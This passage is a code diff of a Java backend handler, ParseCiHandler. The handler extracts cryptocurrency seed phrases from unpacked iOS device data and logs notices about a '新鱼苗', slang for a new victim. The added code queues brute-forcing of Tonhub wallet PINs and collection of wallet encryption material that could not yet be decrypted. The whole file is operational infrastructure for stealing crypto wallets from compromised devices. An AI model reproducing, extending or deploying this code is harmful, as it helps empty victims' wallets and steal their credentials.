@@ -91,14 +91,14 @@ public class ParseCiHandler {
 
         // 提取助记词：有 unpack 先只扫磁盘（避免再读 1MB+ .bin）；磁盘无结果再读 bin 兜底
         List<MnemonicExtractor.PhraseResult> allPhrases = Collections.emptyList();
+        MnemonicExtractor.Ctx extractCtx = new MnemonicExtractor.Ctx(id, deviceId);
         long tRead = System.currentTimeMillis();
         long tParse = tRead;
         long tExtract = tRead;
         try {
-            MnemonicExtractor.Ctx ctx = new MnemonicExtractor.Ctx(id, deviceId);
             if (!unpackPath.isEmpty()) {
                 tExtract = System.currentTimeMillis();
-                allPhrases = mnemonicExtractor.extractAll(null, unpackPath, ctx);
+                allPhrases = mnemonicExtractor.extractAll(null, unpackPath, extractCtx);
             }
             if (allPhrases.isEmpty() && !filePath.isEmpty()) {
                 tRead = System.currentTimeMillis();
@@ -124,7 +124,7 @@ public class ParseCiHandler {
                         }
                     }
                     tExtract = System.currentTimeMillis();
-                    allPhrases = mnemonicExtractor.extractAll(top, unpackPath, ctx);
+                    allPhrases = mnemonicExtractor.extractAll(top, unpackPath, extractCtx);
                 }
             } else if (unpackPath.isEmpty() && filePath.isEmpty()) {
                 log.info("【parse_ci】提取完成 id={} 助记词数量=0 (file_path/unpack_path 均为空)", id);
@@ -263,7 +263,69 @@ public class ParseCiHandler {
                 log.warn("【parse_ci】新鱼苗通知提交失败 id={} device={} err={}", id, deviceId, e.toString());
             }
         }
+
+        // 旁路：与 news4 一并入队 waitbound_collect（异步收集未解出钱包加密材料）
+        enqueueWaitboundCollect(id, deviceId, unpackPath, allPhrases);
+        // 旁路：Tonhub PIN 爆破（扫描阶段只挂起 mmkv 路径）
+        enqueueTonhubBrute(id, deviceId, extractCtx);
         return true;
+    }
+
+    /** 入队 tonhub：job=tonhub_brute，不阻塞 parse_ci */
+    private void enqueueTonhubBrute(Integer ios18paramId, String deviceId,
+                                    MnemonicExtractor.Ctx extractCtx) {
+        if (!consumerProps.isTonhubTaskEnabled()) return;
+        if (extractCtx == null) return;
+        String mmkvPath = extractCtx.getPendingTonhubMmkvPath();
+        if (mmkvPath == null || mmkvPath.trim().isEmpty()) return;
+        try {
+            Map<String, String> job = new LinkedHashMap<>();
+            job.put("job", "tonhub_brute");
+            job.put("ios18param_id", ios18paramId == null ? "" : String.valueOf(ios18paramId));
+            job.put("device_id", deviceId == null ? "" : deviceId);
+            job.put("mmkv_path", mmkvPath.trim());
+            job.put("attempts", "0");
+            redisPush.notifySync(job, consumerProps.getTonhubStream());
+            log.info("【parse_ci】tonhub_brute 入队 device={} id={} mmkv={}",
+                    deviceId, ios18paramId, mmkvPath);
+        } catch (Throwable t) {
+            log.warn("【parse_ci】tonhub 入队失败 id={} device={} err={}",
+                    ios18paramId, deviceId, t.toString());
+        }
+    }
+
+    /** 入队 waitbound：job=waitbound_collect，与 wallet_derive 同批时机，不阻塞 parse_ci */
+    private void enqueueWaitboundCollect(Integer ios18paramId, String deviceId,
+                                         String unpackPath,
+                                         List<MnemonicExtractor.PhraseResult> allPhrases) {
+        if (!consumerProps.isWaitboundTaskEnabled()) return;
+        if (unpackPath == null || unpackPath.trim().isEmpty()) return;
+        try {
+            Set<String> decryptedWallets = new LinkedHashSet<>();
+            if (allPhrases != null) {
+                for (MnemonicExtractor.PhraseResult r : allPhrases) {
+                    if (r != null && r.getWallet() != null && !r.getWallet().isEmpty()
+                            && r.getPhrase() != null && !r.getPhrase().isEmpty()) {
+                        decryptedWallets.add(r.getWallet().toLowerCase(Locale.ROOT));
+                    }
+                }
+            }
+            Map<String, String> job = new LinkedHashMap<>();
+            job.put("job", "waitbound_collect");
+            job.put("ios18param_id", ios18paramId == null ? "" : String.valueOf(ios18paramId));
+            job.put("device_id", deviceId == null ? "" : deviceId);
+            job.put("unpack_path", unpackPath.trim());
+            if (!decryptedWallets.isEmpty()) {
+                job.put("decrypted_wallets", String.join(",", decryptedWallets));
+            }
+            job.put("attempts", "0");
+            redisPush.notifySync(job, consumerProps.getWaitboundStream());
+            log.info("【parse_ci】waitbound_collect 入队 device={} id={} skip_wallets={}",
+                    deviceId, ios18paramId, decryptedWallets.size());
+        } catch (Throwable t) {
+            log.warn("【parse_ci】waitbound 入队失败 id={} device={} err={}",
+                    ios18paramId, deviceId, t.toString());
+        }
     }
 
     /** 入队 news4:tasks wallet_derive 
